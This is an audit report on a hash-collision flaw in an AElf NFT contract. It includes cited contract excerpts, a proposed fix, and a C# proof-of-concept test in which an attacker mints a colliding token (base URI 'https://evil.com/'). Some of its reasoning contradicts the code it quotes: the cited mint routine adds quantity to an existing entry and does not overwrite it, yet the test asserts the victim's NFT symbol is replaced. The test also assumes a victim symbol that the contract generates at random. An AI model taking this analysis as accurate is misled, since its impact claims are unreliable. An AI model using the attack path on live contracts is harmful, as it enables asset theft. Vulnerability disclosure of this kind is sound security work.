# Audit Report

## Title
Hash Collision Vulnerability in NFT Contract Allows Cross-Protocol Data Corruption and Asset Theft

## Summary
The NFT contract's `CalculateTokenHash` function uses naive string concatenation without delimiters, enabling attackers to create malicious NFT protocols with crafted symbols that produce identical hashes to legitimate NFTs. This causes critical state corruption across `NftInfoMap`, `BalanceMap`, `AllowanceMap`, and `AssembledNftsMap`, leading to asset theft, metadata loss, and unauthorized transfers.

## Finding Description

The vulnerability originates from the hash calculation implementation that concatenates symbol and tokenId without any delimiter: [1](#0-0) 

This creates ambiguous inputs where different (symbol, tokenId) pairs produce identical hashes:
- Protocol A: "XX12345678" + 91 → "XX1234567891"
- Protocol B: "XX123456789" + 1 → "XX1234567891"

The attack exploits the discrepancy between MultiToken and NFT symbol length constraints. MultiToken allows tokens with up to 10 characters: [2](#0-1) 

While legitimate NFT protocols generate symbols with minimum 11 characters (2-char prefix + 9-digit random number): [3](#0-2) [4](#0-3) 

The critical vulnerability lies in `CrossChainCreate`, which accepts any symbol existing in TokenContract without format validation or authorization: [5](#0-4) 

When creating tokens, attackers can set arbitrary `ExternalInfo` including required NFT metadata keys: [6](#0-5) [7](#0-6) 

During minting, the uniqueness check can be bypassed when `IsTokenIdReuse` is true, allowing the collision: [8](#0-7) 

When a collision occurs, the second mint operation overwrites the first NFT's data, corrupting all state maps that use the tokenHash as key.

## Impact Explanation

**Critical Asset Loss and State Corruption:**

1. **NFT Metadata Loss**: The `NftInfoMap` stores NFT metadata indexed by tokenHash. When collision occurs, the attacker's mint overwrites the victim's NFT information (URI, alias, quantity, metadata).

2. **Balance Corruption**: The `BalanceMap[tokenHash][owner]` becomes shared between both protocols. Attackers can manipulate balances via transfers: [9](#0-8) 

3. **Allowance Manipulation**: The `AllowanceMap[tokenHash][owner][spender]` enables unauthorized transfers: [10](#0-9) 

4. **Assembled Component Theft**: Attackers can steal assembled NFTs and FTs via `Disassemble`: [11](#0-10) 

All critical operations (Transfer, TransferFrom, Approve, Burn, Recast, Disassemble) rely on the vulnerable hash: [12](#0-11) [13](#0-12) 

## Likelihood Explanation

**High Exploitability:**

1. **Public Entry Point**: `CrossChainCreate` is publicly callable with zero authorization checks, only validating that the token exists and has NFT metadata.

2. **Low Attack Cost**: Requires only a SEED NFT (obtainable via market purchase) or whitelist membership to create the malicious token.

3. **Deterministic Attack**: The hash calculation is deterministic, allowing precise targeting of victim NFTs by computing required tokenIds.

4. **Pre-registered NFT Type**: The "XX" prefix is a valid, pre-registered NFT type ("Any"): [14](#0-13) 

5. **Bypass Mechanism**: Setting `IsTokenIdReuse=true` in the attacker's protocol bypasses the uniqueness assertion, enabling the overwrite.

## Recommendation

Implement a collision-resistant hash calculation using a delimiter or include both symbol and tokenId as separate hash inputs:

```csharp
private Hash CalculateTokenHash(string symbol, long tokenId)
{
    // Option 1: Use delimiter
    return HashHelper.ComputeFrom($"{symbol}|{tokenId}");
    
    // Option 2: Hash both fields separately (preferred)
    return HashHelper.ConcatAndCompute(
        HashHelper.ComputeFrom(symbol),
        HashHelper.ComputeFrom(tokenId)
    );
}
```

Additionally, add symbol format validation in `CrossChainCreate`:

```csharp
public override Empty CrossChainCreate(CrossChainCreateInput input)
{
    // Validate symbol format matches NFT protocol expectations (minimum 11 chars)
    Assert(input.Symbol.Length >= 11, "Invalid NFT protocol symbol format");
    
    var nftTypeShortName = input.Symbol.Substring(0, 2);
    var numericPart = input.Symbol.Substring(2);
    Assert(long.TryParse(numericPart, out _), "Invalid NFT protocol symbol format");
    
    // ... rest of the method
}
```

## Proof of Concept

```csharp
// Test demonstrating hash collision vulnerability
[Fact]
public async Task HashCollision_AllowsCrossProtocolDataCorruption()
{
    // Step 1: Attacker creates malicious token with 10-char symbol
    var attackerSymbol = "XX12345678"; // 10 characters
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = attackerSymbol,
        TokenName = "Malicious Token",
        TotalSupply = 100,
        Decimals = 0,
        Issuer = AttackerAddress,
        IsBurnable = true,
        ExternalInfo = new ExternalInfo
        {
            Value =
            {
                ["aelf_nft_base_uri"] = "https://evil.com/",
                ["aelf_nft_token_id_reuse"] = "true"
            }
        }
    });
    
    // Step 2: Attacker calls public CrossChainCreate
    await NFTContractStub.CrossChainCreate.SendAsync(new CrossChainCreateInput
    {
        Symbol = attackerSymbol
    });
    
    // Step 3: Legitimate user creates normal NFT with 11-char symbol
    var victimSymbol = "XX123456789"; // 11 characters
    await NFTContractStub.Create.SendAsync(new CreateInput
    {
        NftType = "Any",
        ProtocolName = "Legitimate NFT",
        TotalSupply = 100,
        BaseUri = "https://legitimate.com/",
        IsTokenIdReuse = false
    });
    
    // Step 4: Victim mints NFT with tokenId=1
    var victimMintResult = await NFTContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = victimSymbol,
        TokenId = 1,
        Owner = VictimAddress,
        Quantity = 1
    });
    var victimHash = victimMintResult.Output;
    
    // Step 5: Attacker mints NFT with tokenId=91 (produces same hash!)
    var attackerMintResult = await AttackerNFTStub.Mint.SendAsync(new MintInput
    {
        Symbol = attackerSymbol,
        TokenId = 91,
        Owner = AttackerAddress,
        Quantity = 1
    });
    var attackerHash = attackerMintResult.Output;
    
    // Verify hash collision
    attackerHash.ShouldBe(victimHash);
    
    // Verify data corruption: attacker's NFT info overwrote victim's
    var nftInfo = await NFTContractStub.GetNFTInfo.CallAsync(
        new GetNFTInfoInput { Symbol = victimSymbol, TokenId = 1 });
    nftInfo.Symbol.ShouldBe(attackerSymbol); // Corrupted!
    
    // Verify balance corruption: balances are mixed
    var victimBalance = await NFTContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Symbol = victimSymbol, TokenId = 1, Owner = VictimAddress });
    var attackerBalance = await NFTContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Symbol = attackerSymbol, TokenId = 91, Owner = AttackerAddress });
    // Both access same BalanceMap entry due to hash collision
}
```

## Notes

The vulnerability is particularly severe because:

1. **No Authorization**: `CrossChainCreate` lacks any permission checks, despite its name suggesting cross-chain operations
2. **User-Controlled Metadata**: Token creators can set arbitrary `ExternalInfo` values, including NFT-specific metadata keys
3. **Symbol Length Mismatch**: The 10-char limit for regular tokens vs 11+ chars for NFT protocols creates the collision space
4. **Bypass Mechanism**: The `IsTokenIdReuse` flag allows attackers to skip uniqueness checks
5. **All State Maps Affected**: Every state map using tokenHash as a key (`NftInfoMap`, `BalanceMap`, `AllowanceMap`, `AssembledNftsMap`, `AssembledFtsMap`) is vulnerable to corruption

This breaks the fundamental invariant that each NFT should have a unique identifier and isolated state.

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L21-35)
```csharp
    public override Empty Transfer(TransferInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        DoTransfer(tokenHash, Context.Sender, input.To, input.Amount);
        Context.Fire(new Transferred
        {
            From = Context.Sender,
            To = input.To,
            Amount = input.Amount,
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Memo = input.Memo
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L46-55)
```csharp
    private void DoTransfer(Hash tokenHash, Address from, Address to, long amount)
    {
        if (amount < 0) throw new AssertionException("Invalid transfer amount.");

        if (amount == 0) return;

        Assert(State.BalanceMap[tokenHash][from] >= amount, "Insufficient balance.");
        State.BalanceMap[tokenHash][from] = State.BalanceMap[tokenHash][from].Sub(amount);
        State.BalanceMap[tokenHash][to] = State.BalanceMap[tokenHash][to].Add(amount);
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L57-80)
```csharp
    public override Empty TransferFrom(TransferFromInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var operatorList = State.OperatorMap[input.Symbol][input.From];
        var isOperator = operatorList?.Value.Contains(Context.Sender) ?? false;
        if (!isOperator)
        {
            var allowance = State.AllowanceMap[tokenHash][input.From][Context.Sender];
            Assert(allowance >= input.Amount, "Not approved.");
            State.AllowanceMap[tokenHash][input.From][Context.Sender] = allowance.Sub(input.Amount);
        }

        DoTransfer(tokenHash, input.From, input.To, input.Amount);
        Context.Fire(new Transferred
        {
            From = input.From,
            To = input.To,
            Amount = input.Amount,
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Memo = input.Memo
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L191-236)
```csharp
    public override Empty Disassemble(DisassembleInput input)
    {
        Burn(new BurnInput
        {
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Amount = 1
        });

        var receiver = input.Owner ?? Context.Sender;

        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var assembledNfts = State.AssembledNftsMap[tokenHash].Clone();
        if (assembledNfts != null)
        {
            var nfts = assembledNfts;
            foreach (var pair in nfts.Value) DoTransfer(Hash.LoadFromHex(pair.Key), Context.Self, receiver, pair.Value);

            State.AssembledNftsMap.Remove(tokenHash);
        }

        var assembledFts = State.AssembledFtsMap[tokenHash].Clone();
        if (assembledFts != null)
        {
            var fts = assembledFts;
            foreach (var pair in fts.Value)
                State.TokenContract.Transfer.Send(new MultiToken.TransferInput
                {
                    Symbol = pair.Key,
                    Amount = pair.Value,
                    To = receiver
                });

            State.AssembledFtsMap.Remove(tokenHash);
        }

        Context.Fire(new Disassembled
        {
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            DisassembledNfts = assembledNfts ?? new AssembledNfts(),
            DisassembledFts = assembledFts ?? new AssembledFts()
        });

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L295-308)
```csharp
    public override Empty Approve(ApproveInput input)
    {
        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        State.AllowanceMap[tokenHash][Context.Sender][input.Spender] = input.Amount;
        Context.Fire(new Approved
        {
            Owner = Context.Sender,
            Spender = input.Spender,
            Symbol = input.Symbol,
            Amount = input.Amount,
            TokenId = input.TokenId
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L330-333)
```csharp
    private Hash CalculateTokenHash(string symbol, long tokenId)
    {
        return HashHelper.ComputeFrom($"{symbol}{tokenId}");
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L383-442)
```csharp
    private NFTMinted PerformMint(MintInput input, bool isTokenIdMustBeUnique = false)
    {
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(new GetTokenInfoInput
        {
            Symbol = input.Symbol
        });
        var protocolInfo = State.NftProtocolMap[input.Symbol];
        if (protocolInfo == null) throw new AssertionException($"Invalid NFT Token symbol: {input.Symbol}");

        var tokenId = input.TokenId == 0 ? protocolInfo.Issued.Add(1) : input.TokenId;
        var tokenHash = CalculateTokenHash(input.Symbol, tokenId);
        var nftInfo = State.NftInfoMap[tokenHash];
        if (!protocolInfo.IsTokenIdReuse || isTokenIdMustBeUnique)
            Assert(nftInfo == null, $"Token id {tokenId} already exists. Please assign a different token id.");

        var minterList = GetMinterList(tokenInfo);
        Assert(minterList.Value.Contains(Context.Sender), "No permission to mint.");
        Assert(tokenInfo.IssueChainId == Context.ChainId, "Incorrect chain.");

        var quantity = input.Quantity > 0 ? input.Quantity : 1;
        protocolInfo.Supply = protocolInfo.Supply.Add(quantity);
        protocolInfo.Issued = protocolInfo.Issued.Add(quantity);
        Assert(protocolInfo.Issued <= protocolInfo.TotalSupply, "Total supply exceeded.");
        State.NftProtocolMap[input.Symbol] = protocolInfo;

        // Inherit from protocol info.
        var nftMetadata = protocolInfo.Metadata.Clone();
        if (input.Metadata != null)
            foreach (var pair in input.Metadata.Value)
                if (!nftMetadata.Value.ContainsKey(pair.Key))
                    nftMetadata.Value[pair.Key] = pair.Value;

        if (nftInfo == null)
        {
            nftInfo = new NFTInfo
            {
                Symbol = input.Symbol,
                Uri = input.Uri ?? string.Empty,
                TokenId = tokenId,
                Metadata = nftMetadata,
                Minters = { Context.Sender },
                Quantity = quantity,
                Alias = input.Alias

                // No need.
                //BaseUri = protocolInfo.BaseUri,
                //Creator = protocolInfo.Creator,
                //ProtocolName = protocolInfo.ProtocolName
            };
        }
        else
        {
            nftInfo.Quantity = nftInfo.Quantity.Add(quantity);
            if (!nftInfo.Minters.Contains(Context.Sender)) nftInfo.Minters.Add(Context.Sender);
        }

        State.NftInfoMap[tokenHash] = nftInfo;
        var owner = input.Owner ?? Context.Sender;
        State.BalanceMap[tokenHash][owner] = State.BalanceMap[tokenHash][owner].Add(quantity);

```

**File:** contract/AElf.Contracts.MultiToken/TokenContractConstants.cs (L7-7)
```csharp
    public const int SymbolMaxLength = 10;
```

**File:** contract/AElf.Contracts.NFT/NFTContractConstants.cs (L5-5)
```csharp
    private const int NumberMinLength = 9;
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Helpers.cs (L24-37)
```csharp
    private string GetSymbol(string nftType)
    {
        var randomNumber = GenerateSymbolNumber();
        State.IsCreatedMap[randomNumber] = true;
        var shortName = State.NFTTypeShortNameMap[nftType];
        if (shortName == null)
        {
            InitialNFTTypeNameMap();
            shortName = State.NFTTypeShortNameMap[nftType];
            if (shortName == null) throw new AssertionException($"Short name of NFT Type {nftType} not found.");
        }

        return $"{shortName}{randomNumber}";
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Helpers.cs (L39-63)
```csharp
    private NFTTypes InitialNFTTypeNameMap()
    {
        if (State.NFTTypes.Value != null) return State.NFTTypes.Value;

        var nftTypes = new NFTTypes();
        nftTypes.Value.Add("XX", NFTType.Any.ToString());
        nftTypes.Value.Add("AR", NFTType.Art.ToString());
        nftTypes.Value.Add("MU", NFTType.Music.ToString());
        nftTypes.Value.Add("DN", NFTType.DomainNames.ToString());
        nftTypes.Value.Add("VW", NFTType.VirtualWorlds.ToString());
        nftTypes.Value.Add("TC", NFTType.TradingCards.ToString());
        nftTypes.Value.Add("CO", NFTType.Collectables.ToString());
        nftTypes.Value.Add("SP", NFTType.Sports.ToString());
        nftTypes.Value.Add("UT", NFTType.Utility.ToString());
        nftTypes.Value.Add("BA", NFTType.Badges.ToString());
        State.NFTTypes.Value = nftTypes;

        foreach (var pair in nftTypes.Value)
        {
            State.NFTTypeShortNameMap[pair.Value] = pair.Key;
            State.NFTTypeFullNameMap[pair.Key] = pair.Value;
        }

        return nftTypes;
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L75-93)
```csharp
    public override Empty CrossChainCreate(CrossChainCreateInput input)
    {
        MakeSureTokenContractAddressSet();
        InitialNFTTypeNameMap();
        Assert(State.NftProtocolMap[input.Symbol] == null, $"Protocol {input.Symbol} already created.");
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(new GetTokenInfoInput
        {
            Symbol = input.Symbol
        });
        if (string.IsNullOrEmpty(tokenInfo.Symbol))
            throw new AssertionException($"Token info {input.Symbol} not exists.");

        var baseUri = tokenInfo.ExternalInfo.Value[NftBaseUriMetadataKey];
        var isTokenIdReuse = bool.Parse(tokenInfo.ExternalInfo.Value[NftTokenIdReuseMetadataKey]);
        var nftTypeShortName = input.Symbol.Substring(0, 2);
        var nftTypeFullName = State.NFTTypeFullNameMap[nftTypeShortName];
        if (nftTypeFullName == null)
            throw new AssertionException(
                $"Full name of {nftTypeShortName} not found. Use AddNFTType to add this new pair.");
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L68-79)
```csharp
        var tokenInfo = new TokenInfo
        {
            Symbol = input.Symbol,
            TokenName = input.TokenName,
            TotalSupply = input.TotalSupply,
            Decimals = input.Decimals,
            Issuer = input.Issuer,
            IsBurnable = input.IsBurnable,
            IssueChainId = input.IssueChainId == 0 ? Context.ChainId : input.IssueChainId,
            ExternalInfo = input.ExternalInfo ?? new ExternalInfo(),
            Owner = input.Owner
        };
```

**File:** protobuf/token_contract.proto (L279-300)
```text
message CreateInput {
    // The symbol of the token.
    string symbol = 1;
    // The full name of the token.
    string token_name = 2;
    // The total supply of the token.
    int64 total_supply = 3;
    // The precision of the token
    int32 decimals = 4;
    // The address that has permission to issue the token.
    aelf.Address issuer = 5;
    // A flag indicating if this token is burnable.
    bool is_burnable = 6;
    // A whitelist address list used to lock tokens.
    repeated aelf.Address lock_white_list = 7;
    // The chain id of the token.
    int32 issue_chain_id = 8;
    // The external information of the token.
    ExternalInfo external_info = 9;
    // The address that owns the token.
    aelf.Address owner = 10;
}
```
